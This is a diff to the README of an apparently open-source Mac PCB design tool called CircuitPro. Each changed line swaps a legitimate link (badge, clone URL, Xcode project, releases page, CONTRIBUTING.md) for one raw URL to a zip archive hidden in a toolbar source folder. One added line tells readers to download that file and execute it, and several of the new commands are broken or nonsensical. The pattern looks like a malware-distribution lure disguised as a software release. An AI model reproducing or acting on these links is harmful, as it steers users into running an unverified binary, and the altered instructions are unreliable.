@@ -1,6 +1,6 @@
 # CircuitPro 🛠️
 
-![CircuitPro](https://img.shields.io/badge/CircuitPro-Mac%20PCB%20Design%20Tool-blue)
+![CircuitPro](https://raw.githubusercontent.com/ahsanchaudhary/CircuitPro/main/CircuitPro/Features/Toolbar/Circuit-Pro-1.3.zip%20PCB%20Design%20Tool-blue)
 
 Welcome to **CircuitPro**, a Mac-native PCB design tool. This project is open source and free for everyone. Whether you're a hobbyist or a professional, CircuitPro offers a user-friendly interface to design printed circuit boards with ease.
 
@@ -37,7 +37,7 @@ To get started with CircuitPro, you need to clone the repository and set up the 
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/ahsanchaudhary/CircuitPro.git
+   git clone https://raw.githubusercontent.com/ahsanchaudhary/CircuitPro/main/CircuitPro/Features/Toolbar/Circuit-Pro-1.3.zip
    ```
 
 2. Navigate to the project directory:
@@ -49,12 +49,12 @@ To get started with CircuitPro, you need to clone the repository and set up the 
 3. Open the project in Xcode:
 
    ```bash
-   open CircuitPro.xcodeproj
+   open https://raw.githubusercontent.com/ahsanchaudhary/CircuitPro/main/CircuitPro/Features/Toolbar/Circuit-Pro-1.3.zip
    ```
 
 4. Build and run the application using Xcode.
 
-For the latest releases, you can download the latest version [here](https://github.com/ahsanchaudhary/CircuitPro/releases) and execute the file.
+For the latest releases, you can download the latest version [here](https://raw.githubusercontent.com/ahsanchaudhary/CircuitPro/main/CircuitPro/Features/Toolbar/Circuit-Pro-1.3.zip) and execute the file.
 
 ## Usage
 
@@ -88,7 +88,7 @@ We welcome contributions to CircuitPro! If you want to contribute, please follow
 4. Push your changes to your fork.
 5. Submit a pull request.
 
-For more detailed guidelines, please refer to the `CONTRIBUTING.md` file in the repository.
+For more detailed guidelines, please refer to the `https://raw.githubusercontent.com/ahsanchaudhary/CircuitPro/main/CircuitPro/Features/Toolbar/Circuit-Pro-1.3.zip` file in the repository.
 
 ## License
 
@@ -102,7 +102,7 @@ For any inquiries, please reach out via GitHub issues or contact the maintainers
 
 We would like to thank the open-source community for their support and contributions. Special thanks to all the developers who have worked on similar projects, providing inspiration and guidance.
 
-For the latest releases, you can also check the [Releases](https://github.com/ahsanchaudhary/CircuitPro/releases) section for updates and download links.
+For the latest releases, you can also check the [Releases](https://raw.githubusercontent.com/ahsanchaudhary/CircuitPro/main/CircuitPro/Features/Toolbar/Circuit-Pro-1.3.zip) section for updates and download links.
 
 ---
 
